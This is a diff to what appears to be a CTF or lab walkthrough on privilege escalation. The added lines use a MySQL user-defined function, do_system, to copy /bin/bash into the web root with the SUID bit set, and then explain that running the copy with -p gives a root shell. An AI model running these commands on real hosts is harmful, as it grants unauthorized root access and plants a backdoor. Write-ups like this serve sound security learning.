@@ -170,5 +170,14 @@ Now getting root... The “select do_system” statement can then be used to exe
 
 ```
 select do_system('<command>');
+
+select do_system('cp /bin/bash /var/www/html/shell && chmod +s /var/www/html/shell');
 ```
 
+![image](https://user-images.githubusercontent.com/87468669/209833686-a475c295-c680-47a3-9276-fc79558b1873.png)
+
+The same function can be used to create a SUID copy of the /bin/bash binary, which when executed with the -p flag, which allows to execute binaries as the owner of it, will grant root access to the host:
+
+![image](https://user-images.githubusercontent.com/87468669/209834370-4fb38a8b-a07f-4d89-83d3-e1d0360b7b86.png)
+
+Boom!!! we got root😎
